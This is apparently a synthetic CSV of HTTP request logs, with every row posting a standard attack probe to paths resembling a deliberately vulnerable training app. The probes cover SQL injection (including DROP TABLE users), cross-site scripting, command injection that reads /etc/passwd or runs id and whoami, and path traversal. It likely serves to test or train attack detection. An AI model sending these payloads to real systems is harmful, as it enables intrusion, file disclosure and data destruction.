_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
9e5df094-5177-45fa-bcb4-f6ac9e86181f,1e5bad4fd26530840d985ca53bb6ac72,15972,215.56.24.112,POST,SqlInjection/attack8,HTTP/1.1,payload=84dafe9b && whoami,400,2025-11-26T13:19:12.863609
d34216e0-8e3a-49c5-94f1-72469b05723a,a33223124fa781c83eb89af7401f75d4,15972,104.242.131.72,POST,SqlInjection/attack8,HTTP/1.1,payload=<img src=x onerror=alert(1)> ,400,2025-11-26T13:19:12.946511
bd2b5193-2d9c-44c2-9aea-bd55424d8d30,56482b8cdbe1f3cc8af15844691231a1,15972,209.84.178.180,POST,SqlInjection/attack8,HTTP/1.1,payload=| dir&nonce=5890b51e,400,2025-11-26T13:19:13.014505
bcc1fcb1-36ce-408c-92fb-981471733957,1f645a46e138ca6069a047be1e521e29,14741,151.250.99.47,POST,service/restxml,HTTP/1.1,"payload=d1eabe3e '""><script>alert(1)</script>",404,2025-11-26T13:19:13.068127
092cb144-3dfd-466f-8188-0bd155a7a286,1630afb343a241fc116ab54ea7752a0a,14753,211.247.242.209,POST,cia/command-injection,HTTP/1.1,payload=58108ce8 <script>alert('XSS')</script>,404,2025-11-26T13:19:13.153969
0296d789-faf5-4cfa-ae03-c72e4aba7f99,4126b4d098591924dc92c06e4b37eff5,279,73.67.243.96,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=4b0b9928 javascript:alert(1),200,2025-11-26T13:19:13.252439
6e3444ac-3dc9-42aa-8c02-cd89054672f2,63d090050201368b766b8dd74fdc01a1,279,166.133.184.179,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=javascript:alert(1) -- 9dc07b72,200,2025-11-26T13:19:13.384064
d324d7df-06c7-451f-883f-91ebb6c9681f,7fa617fabd5f3e2c9222bfdd3e8f2ff0,15972,96.104.176.148,POST,SqlInjection/attack8,HTTP/1.1,payload=/proc/self/environ -- 7809db99,400,2025-11-26T13:19:13.507554
db52e71b-108d-4f06-aaf8-ee58b3d7a709,a26dad380e60b6a856409d8afe05b3de,279,77.45.46.233,POST,CrossSiteScripting/attack1,HTTP/1.1,"payload='""><script>alert(1)</script> ",200,2025-11-26T13:19:13.602741
f9d64489-e1c8-45db-b23f-48ced8c4866c,6d4f77297c676300f9a1a89469d8dccf,14753,88.192.39.62,POST,cia/command-injection,HTTP/1.1,payload=; cat /etc/passwd -- 95f90c72,404,2025-11-26T13:19:13.672962
b0e7d320-85ad-45f6-9c0f-febbab4a6f59,50ed3e40ea9d841593c5dd17e4d70d27,14753,214.62.108.178,POST,cia/command-injection,HTTP/1.1,payload=7826c497 admin' --,404,2025-11-26T13:19:13.753087
bfd0c169-6d58-492b-a3b8-def022214c9f,4be7feb3b0ddb9f35b4dd1abe613b8ac,279,134.93.178.95,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=39a774f6 `ping 127.0.0.1`,200,2025-11-26T13:19:13.863452
a12ec400-c70b-473b-96d6-b65864ee8af4,b3a81ec724f069a7338df5437bcea54c,14741,48.97.233.68,POST,service/restxml,HTTP/1.1,payload=bcea6b42 | dir,404,2025-11-26T13:19:13.976045
48b4cc3a-717b-4fd1-8ba7-2e0327f8af1b,0c74ad3299e98ab0b5d761101f334f62,279,186.30.146.146,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=$(id) -- 0a9b99bc,200,2025-11-26T13:19:14.059302
c21c2376-3f39-4470-9d3a-2b56cce1ec7f,1413d60ba36657c6a31ee15d51c6aaef,14741,208.125.28.5,POST,service/restxml,HTTP/1.1,payload=<img src=x onerror=alert(1)>&nonce=9cf7727c,404,2025-11-26T13:19:14.169169
173fabcb-f48b-4e23-9ce7-458e34417996,437cd3977f3af5bb9cff2955a2d9fa24,15972,45.205.14.14,POST,SqlInjection/attack8,HTTP/1.1,payload=37f4d11e `ping 127.0.0.1`,400,2025-11-26T13:19:14.247550
6f85ff03-7625-44dc-9936-fb949fd042b2,52bd66dbf78f1c723c35ff277b433ecb,15972,45.69.191.244,POST,SqlInjection/attack8,HTTP/1.1,payload=' OR 1=1# -- 17dab1f7,400,2025-11-26T13:19:14.332877
007a3807-7d13-4bae-bb44-072d5e0d9d41,c17243baee81435de9f78502d3878e9e,15972,153.137.84.138,POST,SqlInjection/attack8,HTTP/1.1,payload=..\..\..\windows\win.ini&nonce=c8e0c514,400,2025-11-26T13:19:14.389404
9097ac12-797a-4e8c-9a1c-3a97fe4201f9,f47052a6568064ec0e573a56fc445dc4,15972,172.35.109.137,POST,SqlInjection/attack8,HTTP/1.1,payload=; cat /etc/passwd ,400,2025-11-26T13:19:14.473702
0f676d46-f3db-4320-aef4-a7cf8a864469,d757958211666af2868e9601b0e0a731,279,117.139.184.131,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=; cat /etc/passwd -- 32945bb6,200,2025-11-26T13:19:14.544040
454ca92a-0f24-42fd-8117-1b2c34e431b1,642a5ff5f8c47c384bce6040d9903f51,15972,151.101.251.3,POST,SqlInjection/attack8,HTTP/1.1,payload=javascript:alert(1)&nonce=9d46396b,400,2025-11-26T13:19:14.611904
c97cdb76-b12d-4ec2-a707-ae810fb3233a,75c915f5e7b9afa34b5e63a3e41cbc34,15972,70.241.97.196,POST,SqlInjection/attack8,HTTP/1.1,payload=<img src=x onerror=alert(1)> -- e5493f25,400,2025-11-26T13:19:14.709523
ad8d6386-4d4c-4050-a090-8368caa3b98c,eb8c00207639992ba1cc4e4f54214d83,14741,106.80.40.165,POST,service/restxml,HTTP/1.1,payload=<img src=x onerror=alert(1)>&nonce=dead1fa1,404,2025-11-26T13:19:14.749911
c1b098d5-2352-4cc1-8619-37850044ae4d,ef32cc0b2213946aede288b9290912d7,15972,150.83.9.140,POST,SqlInjection/attack8,HTTP/1.1,"payload=UNION SELECT NULL, NULL ",400,2025-11-26T13:19:14.815750
40799e53-22c0-40dc-b17f-13be5cf70ed3,1a179c1a059cc5c5e1ea73b926d3b457,279,196.99.119.37,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=..\..\..\windows\win.ini ,200,2025-11-26T13:19:14.908556
469837ac-d74f-4e9c-b2dc-06d1220130da,e9bc51f83231e9df4f66df6ac3501ee4,15972,141.162.239.25,POST,SqlInjection/attack8,HTTP/1.1,payload=WAITFOR DELAY '0:0:5' -- 710adbdd,400,2025-11-26T13:19:14.994293
15c6c94b-4c06-4fb4-afd5-e336cf2383b7,50175faa260e319f679b946e2eb98aed,15972,124.5.68.74,POST,SqlInjection/attack8,HTTP/1.1,payload=$(id) -- e46895c7,400,2025-11-26T13:19:15.083092
843298f0-a9d6-4447-999e-567f2d323764,344d4a3efae0fa110e80f9c0cc19ab10,14753,136.181.35.180,POST,cia/command-injection,HTTP/1.1,payload=1e066b81 <svg/onload=alert(1)>,404,2025-11-26T13:19:15.137863
1cab3aed-a8e0-406c-be9e-105728950ea4,90ae086914e24ed40384fbc7e33e77d8,15972,37.145.144.225,POST,SqlInjection/attack8,HTTP/1.1,"payload=f00b6bec '""><script>alert(1)</script>",400,2025-11-26T13:19:15.190424
bc86b6e3-10bc-413c-9400-5cdd776c8b34,edadf97afd3a0d40a718182a61c7c71e,15972,62.132.77.58,POST,SqlInjection/attack8,HTTP/1.1,payload=/proc/self/environ -- f60cc609,400,2025-11-26T13:19:15.272618
35556dfd-3f0e-4f56-b66b-1438c132870e,ffc4497ca01fca9a92e72f2ebd161754,14753,67.20.64.72,POST,cia/command-injection,HTTP/1.1,payload=javascript:alert(1)&nonce=747299af,404,2025-11-26T13:19:15.343227
0121241d-269e-4e89-b836-90a581e72562,cd4061ab100217bd3bd649ae51d17e49,14741,101.21.99.164,POST,service/restxml,HTTP/1.1,payload=..\..\..\windows\win.ini ,404,2025-11-26T13:19:15.412390
43edcd13-593e-485d-9452-cb536c83129f,663a05082ee31b7f112b259f5de979a4,279,142.241.195.133,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=`ping 127.0.0.1` -- 857a6354,200,2025-11-26T13:19:15.495496
b04ebded-258d-400e-80e1-2bf9684e099a,39adc413db14b09a438d354acf256f7f,15972,148.91.212.223,POST,SqlInjection/attack8,HTTP/1.1,payload=27eb020c $(id),400,2025-11-26T13:19:15.579184
ad1f8897-b92a-468c-8d3e-5d113371c938,0252560bf2486b1007f2d81d20339952,279,219.81.176.177,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=3da565e8 <img src=x onerror=alert(1)>,200,2025-11-26T13:19:15.651773
dfe0bf78-49e5-4832-84d6-f36b4b67d8e0,dfec712f4b895d212fb68c016aa824ff,14753,134.53.208.5,POST,cia/command-injection,HTTP/1.1,payload=WAITFOR DELAY '0:0:5' ,404,2025-11-26T13:19:15.693481
a3772ae3-4bb5-4b2c-acef-bf5a6d56509f,517ff48320370bbc8e286e71cabb3135,279,25.139.106.153,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=$(id) -- 347f8eee,200,2025-11-26T13:19:15.803114
073ce614-cb43-4564-8363-66063f9c4d87,1c0147a41431aaa52f02d05d227ae77b,14753,72.16.79.219,POST,cia/command-injection,HTTP/1.1,payload=$(id) -- 902a94d0,404,2025-11-26T13:19:15.888120
b44efff0-4b1f-4906-8b40-6d7046d73836,032b78a739e6107cc5d835390b9a5906,14741,218.38.116.97,POST,service/restxml,HTTP/1.1,payload=' OR '1'='1 -- 97554f74,404,2025-11-26T13:19:15.964958
f64cb644-11fb-44b2-9197-77a2eee82fb3,b512611f89e8d194aabec2797c5637de,14753,166.192.86.237,POST,cia/command-injection,HTTP/1.1,payload=../../../../etc/passwd ,404,2025-11-26T13:19:16.058110
195e8400-659e-4227-965b-9167a7399e17,3fdd960533f6af20834035ec0eda2d9d,14741,184.51.118.84,POST,service/restxml,HTTP/1.1,payload=885b9888 $(id),404,2025-11-26T13:19:16.140791
2e8ec3d4-56b6-4b9a-943b-ff30eb602ef7,8e215b09a21c3bda25e6d344acbc6dde,15972,78.86.17.178,POST,SqlInjection/attack8,HTTP/1.1,payload=../../../../etc/passwd ,400,2025-11-26T13:19:16.220823
03f96961-f9fc-4507-a7a6-9c5247b1c4bf,261954ba8404ce7cc2d995d318bcb437,279,6.153.226.49,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=<img src=x onerror=alert(1)> ,200,2025-11-26T13:19:16.299860
7ed3796f-8058-4e3f-82af-bd88884d3a33,72a9730729f7faaf5531fcda8659e28b,14741,135.205.66.139,POST,service/restxml,HTTP/1.1,"payload='""><script>alert(1)</script>&nonce=0f0f294a",404,2025-11-26T13:19:16.395434
6a5d8f4a-1c3e-4148-969b-31d0102244d0,250b2c45456468fdeaa455ec1f98c02f,14753,28.185.64.103,POST,cia/command-injection,HTTP/1.1,payload=/proc/self/environ ,404,2025-11-26T13:19:16.466538
db533d1b-7386-441b-a0df-a1b43fb3deb3,9b563f1c1b848cbd0634017c548ed2ff,14753,196.195.99.112,POST,cia/command-injection,HTTP/1.1,payload=1; DROP TABLE users&nonce=510a04b9,404,2025-11-26T13:19:16.553219
5cd2d282-e7ab-45ea-bb7f-d0b055daff58,761a26f60c09cd4fc65580c8fe8dba1a,14753,114.121.151.178,POST,cia/command-injection,HTTP/1.1,payload=' OR '1'='1&nonce=3004deae,404,2025-11-26T13:19:16.621201
130e18f6-38be-486e-b740-05eb75fc96bd,49aca07eb670de6a3f9607d44185e8c9,14753,52.229.25.113,POST,cia/command-injection,HTTP/1.1,payload=`ping 127.0.0.1` -- 01a038f8,404,2025-11-26T13:19:16.696398
5a052166-af2d-433e-8d77-12bbffe3678f,a47642d31a83ec1dd856baf54b6cbf73,15972,158.198.218.249,POST,SqlInjection/attack8,HTTP/1.1,payload=../../../../etc/passwd&nonce=6428847a,400,2025-11-26T13:19:16.811610
f78cd337-7b45-446c-8934-b6727ac72c60,769e361e6a1d0ed998ece08e760410bb,15972,42.37.238.255,POST,SqlInjection/attack8,HTTP/1.1,payload=; cat /etc/passwd&nonce=c9b40ad1,400,2025-11-26T13:19:16.899005
6db49d0d-fcc4-4322-aa1b-b87f3d9933d3,67e45af7277e30c6365f9ff4065e4ac6,14753,88.59.238.155,POST,cia/command-injection,HTTP/1.1,payload=/proc/self/environ&nonce=11cddd6a,404,2025-11-26T13:19:16.957709
660295bb-ae64-4264-b7a9-8241104c532a,763d80480725a278aecc559647ecc493,14741,9.226.226.26,POST,service/restxml,HTTP/1.1,payload=/proc/self/environ&nonce=3e04a0eb,404,2025-11-26T13:19:17.002382
5eee0535-7424-464b-addf-09edf3cad049,e1a6c758929ff22f8f68ca0c425d109f,279,221.5.48.220,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=' OR '1'='1 ,200,2025-11-26T13:19:17.083492
ea8d5b73-96d9-4c38-8002-bf0f249cba2d,a0a9baa3511eb0e796fb414973931d02,14741,110.213.33.149,POST,service/restxml,HTTP/1.1,payload=javascript:alert(1)&nonce=06a1c735,404,2025-11-26T13:19:17.244805
c1c9dfd8-88dd-4dff-8cfc-bde8adab1295,ed09fc4e59a7005b85d9576787be8558,14741,114.250.74.190,POST,service/restxml,HTTP/1.1,payload=1; DROP TABLE users&nonce=45cf70e4,404,2025-11-26T13:19:17.346435
99b6b9e3-07d6-4480-b620-18ae3838159e,5e80d4a05c20864ece915af48c2eebe5,14753,125.49.198.253,POST,cia/command-injection,HTTP/1.1,payload=`ping 127.0.0.1`&nonce=dde0fc8c,404,2025-11-26T13:19:17.450626
eb726e4e-631e-4edf-b848-507854daa7e3,43f23bbd233cfc4d986bc4ee9c47cf1e,279,185.11.206.105,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=b79f4a01 | dir,200,2025-11-26T13:19:17.532096
13177403-840d-4780-a449-3998ec8e2068,e14ffd7b260a7e09084d404aafb8a45a,279,109.70.124.59,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=/proc/self/environ&nonce=d71ff665,200,2025-11-26T13:19:17.625091
dd22070d-bdd1-42ff-afdf-77ef9def2994,674017b9851ee6f38ff9ffcd455c7fb9,279,185.45.211.116,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=<svg/onload=alert(1)> -- 28f26b9c,200,2025-11-26T13:19:17.746371
06f2ac3f-0c97-4937-a4b3-8d7b0c0f1d3c,1d55e530bd3ed3fa30852eafe26c999f,14753,136.135.218.248,POST,cia/command-injection,HTTP/1.1,payload=58dd4d47 /proc/self/environ,404,2025-11-26T13:19:17.867759
8525eba0-3299-4573-83fe-11270f604486,e73f9c63889f18721afe2fa1b319bc31,14741,71.46.119.193,POST,service/restxml,HTTP/1.1,payload=/proc/self/environ&nonce=ae4d0d0d,404,2025-11-26T13:19:17.963848
6edefb8e-7e81-4c62-a5c9-a7181a4d8d37,7ec1d10942d71d6c8191c57fbee5ff7d,279,35.206.152.103,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=7114c667 /proc/self/environ,200,2025-11-26T13:19:18.047618
f366596c-66f1-4c9c-8bac-db615a372e59,50815c3980970d8e06d4d28d29c36d08,279,162.150.207.175,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=&& whoami&nonce=4ce69ce7,200,2025-11-26T13:19:18.135392
9458aacd-a768-4610-804b-72db91cb3d32,2d4c0266b80453ed3b7deda6705bfd93,14753,102.125.176.139,POST,cia/command-injection,HTTP/1.1,payload=admin' --&nonce=35f54742,404,2025-11-26T13:19:18.224813
edadacf2-04ad-47a7-bc4e-f0443952f6f8,b8b603c6274af8ce164a74ce6c98c2e6,279,36.41.154.176,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=<svg/onload=alert(1)>&nonce=c358132f,200,2025-11-26T13:19:18.329859
feb6edae-8429-44d2-9b40-4b6c66f1728c,c5e189a9fea202ac13626159d75b11e4,279,40.77.80.128,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=bd438d73 /proc/self/environ,200,2025-11-26T13:19:18.453648
b84ca91a-7a40-4aed-8709-166c6200460e,7db2ec862b94bc30da1f97ee4c060bd9,14753,44.255.114.94,POST,cia/command-injection,HTTP/1.1,payload=admin' -- -- a835827e,404,2025-11-26T13:19:18.555472
b877c365-ce11-4a96-93e5-57789a610963,2cb4f43db236fb5d3ae863ba9f671ab0,14753,42.174.107.60,POST,cia/command-injection,HTTP/1.1,payload=2ccd1ea0 $(id),404,2025-11-26T13:19:18.651843
3df72376-4540-44ab-857a-7b15073586c0,8e5c750ef3f04ebf0fe4750360b80c31,14741,106.105.39.170,POST,service/restxml,HTTP/1.1,payload=1; DROP TABLE users&nonce=ddd91a57,404,2025-11-26T13:19:18.752435
3c5b5bcd-9264-40fc-aa5e-694a5ef97da5,06c7e4d4de2daf015ac5fd8b165d8199,14753,47.166.199.78,POST,cia/command-injection,HTTP/1.1,payload=<img src=x onerror=alert(1)> ,404,2025-11-26T13:19:18.832661
c9a4beba-6848-4328-bf29-b1a23beb5bc6,129eae22a658611a3e8867e27ab9c8e5,15972,100.36.37.14,POST,SqlInjection/attack8,HTTP/1.1,payload=`ping 127.0.0.1` -- 20c52de5,400,2025-11-26T13:19:18.905200
5c495b78-7ef7-4765-bdec-a700c3fcb1b0,09102caba361025eb833fde6341ff979,14741,128.13.167.129,POST,service/restxml,HTTP/1.1,payload=a1bdad53 admin' --,404,2025-11-26T13:19:19.000848
e9a141f1-a51b-4900-853e-71b741d61b57,946075e05411e7f6270513fb7767e4b2,14741,89.230.5.4,POST,service/restxml,HTTP/1.1,payload=9e2ea8e0 ; cat /etc/passwd,404,2025-11-26T13:19:19.071180
178d4184-1ed4-408b-8326-0851512dced3,2470d8a6188abc596dea63909756549c,279,23.31.235.211,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=../../../../etc/passwd&nonce=2e5a06df,200,2025-11-26T13:19:19.158327
2a5f443a-222b-48b7-94cf-735a5b684f0b,5be3c255c316f25ce8cba605d6c03fec,14753,21.14.209.204,POST,cia/command-injection,HTTP/1.1,payload=`ping 127.0.0.1` ,404,2025-11-26T13:19:19.268048
feb75bf7-f9e0-40e8-a46a-03334274cbeb,9cd4c4552ecd6cb953a51533df9403d1,14753,125.243.249.128,POST,cia/command-injection,HTTP/1.1,payload=..\..\..\windows\win.ini&nonce=a44d444b,404,2025-11-26T13:19:19.345686
b877f2af-b985-4646-b33c-34b277a353e3,b4e16156bc9f54939c5eb7a9945da99e,14753,190.8.20.165,POST,cia/command-injection,HTTP/1.1,payload=admin' -- -- d8b6b153,404,2025-11-26T13:19:19.436618
6ffbc249-ce68-4b58-8053-a05fce338a30,e0bb4987e8ac1b81df520f449bbc4ce9,14753,29.70.112.59,POST,cia/command-injection,HTTP/1.1,"payload=UNION SELECT NULL, NULL ",404,2025-11-26T13:19:19.520036
72787798-6d5b-4d3e-9143-b2da9a3eead2,3d30970652f4e85e9cc2586fa4fc2709,14753,30.64.146.43,POST,cia/command-injection,HTTP/1.1,payload=1; DROP TABLE users -- 0d510af3,404,2025-11-26T13:19:19.617783
81f9ee89-387b-45b2-a23d-8aa1e8ff2e7d,931b6b72c9760be804725c2edd808ef1,15972,19.41.79.42,POST,SqlInjection/attack8,HTTP/1.1,payload=$(id) -- 9fe6bf8e,400,2025-11-26T13:19:19.713575
bbb575af-2caf-4f87-a7a6-aaf9f8a1af1a,1f2a671be1b34bf7d0ee268b10b49413,14741,191.143.63.98,POST,service/restxml,HTTP/1.1,payload=..\..\..\windows\win.ini -- a0a63040,404,2025-11-26T13:19:19.803631
003e0b4b-7774-44fc-91d1-3f5f5094759b,7345690a4039dae13c8dfdd6d8e18168,14753,165.241.101.38,POST,cia/command-injection,HTTP/1.1,payload=| dir -- b61d48be,404,2025-11-26T13:19:19.861703
35b69431-2425-4978-87ce-7069680f3f1f,a1b07395458b99196a121651e7bea016,279,52.52.120.202,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=WAITFOR DELAY '0:0:5'&nonce=bbb2c747,200,2025-11-26T13:19:19.949573
900c199e-013b-4573-b65c-330ca0f84203,3f1fb7be43f8ee3e5e57214b99a508f6,15972,115.163.72.243,POST,SqlInjection/attack8,HTTP/1.1,payload=| dir&nonce=0b66bf98,400,2025-11-26T13:19:20.039478
d687b990-96be-46a7-b070-2e96153989cc,ff8069234d0fd7b1457dacc5dde0c5ea,15972,73.38.61.70,POST,SqlInjection/attack8,HTTP/1.1,payload=<img src=x onerror=alert(1)>&nonce=074b9238,400,2025-11-26T13:19:20.121066
cc135918-5b9c-4971-8b9e-f34774945954,e6ae5e7a8ac670a00097b36a0e7ed520,15972,219.179.215.75,POST,SqlInjection/attack8,HTTP/1.1,"payload=ca0552d6 UNION SELECT NULL, NULL",400,2025-11-26T13:19:20.165554
2f6e5bbd-1811-4851-a90c-d3a324bd5892,e65afed36b09bde019cbbd575005ce8b,14753,120.35.161.221,POST,cia/command-injection,HTTP/1.1,payload=| dir&nonce=647a3296,404,2025-11-26T13:19:20.237531
33b348b3-6c63-4331-ab27-80f8e53b9e33,ae89f0f71abe208d9a1d02cd89d72398,15972,12.22.189.84,POST,SqlInjection/attack8,HTTP/1.1,payload=534aca05 | dir,400,2025-11-26T13:19:20.309494
04fa3b90-a93e-4f52-9de4-3b373a787a14,d60e9676dbabdbb4d4d53f3861f479c1,14741,116.218.136.31,POST,service/restxml,HTTP/1.1,payload=| dir&nonce=bdf84fc8,404,2025-11-26T13:19:20.379324
824882b4-0853-4e3f-b2e4-eabbd3560aae,2343ef18c41ac9fa8ccbda4c813046fa,14741,158.198.244.219,POST,service/restxml,HTTP/1.1,payload=&& whoami ,404,2025-11-26T13:19:20.451548
9529ed58-7228-410f-90ec-3ac7c643a6ee,cfe7cc7a94c10eb6c9624de0632e39b8,14753,10.89.243.167,POST,cia/command-injection,HTTP/1.1,payload=' OR 1=1#&nonce=0477d163,404,2025-11-26T13:19:20.550414
04d62adc-0764-479a-8466-32d1ab499dde,5212e4de927e6788cb429c70580be189,14741,138.68.182.144,POST,service/restxml,HTTP/1.1,payload=/proc/self/environ&nonce=c0fb4c23,404,2025-11-26T13:19:20.630451
ae2bbeea-3fea-45a5-a6dd-7423b90c854f,26ad43fdfd82f92a14ac8e60345339e1,279,60.199.139.220,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=' OR 1=1# ,200,2025-11-26T13:19:20.727133
4685fc05-eff4-4fa2-9a29-ba21e395deac,77e4d4ac7765afc2acae2fc4359186c0,15972,18.146.24.132,POST,SqlInjection/attack8,HTTP/1.1,payload=../../../../etc/passwd -- e93d52e9,400,2025-11-26T13:19:20.837285
590fbe2b-d0aa-4d30-8aee-2d89068b6ccb,77d1105fd0685c0094a177b8c76c1a84,15972,59.81.252.34,POST,SqlInjection/attack8,HTTP/1.1,payload=/proc/self/environ ,400,2025-11-26T13:19:20.920146
abca2844-5b22-45a1-8208-4a4ef4cee54e,8a079dfcdedd4ac0d51dded94555d955,14741,62.246.166.115,POST,service/restxml,HTTP/1.1,payload=javascript:alert(1) ,404,2025-11-26T13:19:20.965555
e2f681a8-5bfd-4d6a-b8b1-71d6cc00c569,0c2a0d530407a26572235fb6eb4386a2,15972,142.75.210.71,POST,SqlInjection/attack8,HTTP/1.1,payload=admin' -- ,400,2025-11-26T13:19:21.036682
f6bde518-45f4-4347-ae2f-9020562e7ecd,dd378520a7f6179288f461bbf5c63546,279,116.156.116.237,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=javascript:alert(1) ,200,2025-11-26T13:19:21.128649
4f097a28-9d4a-423b-9862-9a08d48ec957,a1498dc534cc530fca70ef5b1acf5400,14741,191.190.184.102,POST,service/restxml,HTTP/1.1,payload=javascript:alert(1)&nonce=e93343cc,404,2025-11-26T13:19:21.209380
e6ff48ce-a2ac-46cf-b28c-9437b12e4585,bd95f4ac7ca79125b81fc9f6eb1110a6,279,133.54.105.109,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=../../../../etc/passwd&nonce=f61f4bf0,200,2025-11-26T13:19:21.278158
58d69ee3-0be9-4c88-af51-dac27890f2b3,955815abe30ad4441adc6bec833ba7c6,15972,185.58.195.220,POST,SqlInjection/attack8,HTTP/1.1,payload=fc252b26 admin' --,400,2025-11-26T13:19:21.390355
11cff754-3bc9-4d8d-94ac-f6c9f399de2e,960cdd872ea36ffec159720e491ab61b,14741,190.67.57.66,POST,service/restxml,HTTP/1.1,payload=<img src=x onerror=alert(1)> -- e70a0f2d,404,2025-11-26T13:19:21.486711
83b54c3a-89ac-4fde-932c-87c7d64294a8,6191001c41c1cccfa917d39abef03b33,14753,17.159.29.79,POST,cia/command-injection,HTTP/1.1,payload=8bbb8928 && whoami,404,2025-11-26T13:19:21.544073
9a7dc563-7a6d-459c-b868-a7a85184086f,6317e9bda2c95dc01c0a8dc8bc996277,14741,195.160.86.9,POST,service/restxml,HTTP/1.1,payload=1; DROP TABLE users&nonce=80807f7b,404,2025-11-26T13:19:21.634507
c8707a6d-094c-49b3-8e00-ad823391f3ea,e19a3056a87da533d6f5bd02996a8746,279,142.194.105.25,POST,CrossSiteScripting/attack1,HTTP/1.1,payload=$(id) ,200,2025-11-26T13:19:21.712744
c5f19701-6d1d-44f8-a13b-dc9b7e70289f,6ef160026b9ac87c5aa4fe89cbb71049,15972,70.151.108.4,POST,SqlInjection/attack8,HTTP/1.1,payload=08c373b3 1; DROP TABLE users,400,2025-11-26T13:19:21.816931
